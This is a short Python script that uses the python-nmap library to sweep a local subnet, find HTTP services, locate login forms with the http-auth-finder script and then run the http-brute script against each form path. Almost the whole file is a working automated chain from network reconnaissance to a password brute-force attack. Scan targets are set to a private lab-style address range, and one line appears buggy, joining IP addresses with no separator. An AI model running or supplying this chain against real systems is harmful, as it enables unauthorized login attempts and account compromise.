import nmap
import re # regex library

nm = nmap.PortScanner() # create a nmap object

ip_range = "10.0.2.1/24" # ip range

nm.scan(ip_range, arguments="-sn") # start nmap scan on related ip range

#print found IPs
#for host in nm.all_hosts():
   # print(host)

# concat all found IPs with leaving space
ip_list = " ".join(nm.all_hosts())
# print(ip_list)

# add argument to scan
nm.scan(ip_list, arguments="-sV")
#print(nm.scaninfo())


http_ip_list =[]
http_port_list = []


for ip in nm.all_hosts():

    if "tcp" in nm[ip]:
        # show open port related IP
        #print(nm[ip]['tcp'].keys())
        #print("---"*20)

        for port in nm[ip]['tcp'].keys():
            # print(nm[ip]['tcp'][port])

            if nm[ip]['tcp'][port]['name'] == "http":
                print(ip, port, nm[ip]['tcp'][port]['product'],
                      nm[ip]['tcp'][port]['version'])

                if ip not in http_ip_list:
                    http_ip_list.append(ip);

                if port not in http_port_list:
                    http_port_list.append(str(port))

#print("###########")
#print(http_ip_list)
#print(http_port_list)
#print("###########")

# ----------------------scan 2-----------------------------
# in terminal, write locate *.nse | grep http , it found this file.
# this scan2 searchs the services related IPs and find 
# /usr/share/nmap/scripts/http-auth-finder.nse

nm.scan("".join(http_ip_list),",".join(http_port_list),"--script http-auth-finder") # to scan, add found http IPs
                               # after "," , add open ports on related IP 


targets = []

# find http script related IPs
for host in nm.all_hosts():
    
    for port in nm[host]['tcp'].keys():
    
        if "script" in nm[host]['tcp'][port]:
            #print(nm[host]['tcp'][port]['script']['http-auth-finder'])
            # take url path related script
            paths =  re.findall(host + ":" + str(port)+"(.*)FORM",nm[host]['tcp'][port]['script']['http-auth-finder'])
    
            for path in paths:
                #print(path)
                new_target = {"host":host,"port":str(port),"path":path.strip()}
                targets.append(new_target)

# bruteforce attack related target    
print(targets)

#/usr/share/nmap/scripts/http-brute.nse
for target in targets:
    host = target['host']
    port = target['port']
    path = target['path']
    ## need to arguments for bruteforce attack
    nm.scan(host,port,"-sV --script http-brute  --script-args path="+path)
    print(nm[host]['tcp'][int(port)]['script'])
    